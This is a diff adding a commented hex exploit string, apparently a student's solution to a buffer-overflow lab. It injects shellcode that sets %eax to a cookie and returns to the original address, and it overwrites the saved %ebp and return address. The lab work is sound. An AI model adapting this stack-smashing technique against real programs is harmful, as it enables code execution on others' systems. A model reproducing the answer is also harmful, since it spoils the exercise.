@@ -1,0 +1,20 @@
+68 93 8c 04  /* 0x556838e8 */ /* start my byte code  */
+08 b8 aa a6
+94 20 c3 00  /* end of my byte code */
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00  
+00 00 00 00
+00 00 00 00
+00 00 00 00  
+40 39 68 55  /* recover %ebp to 0x 55 68 39 40 */
+e8 38 68 55  /* the address of my byte code is 0x 55 68 38 e8 */
+
+ /* Global_val addr is 0x804c1ec  */
+ /* correct return addr is 0x08048c93 */
+ /*   0:	68 93 8c 04 08       	push   $0x8048c93            */
+ /*   5:	b8 aa a6 94 20       	mov    $0x2094a6aa,%eax      */
+ /*   a:	c3                   	ret                          */
+
+  
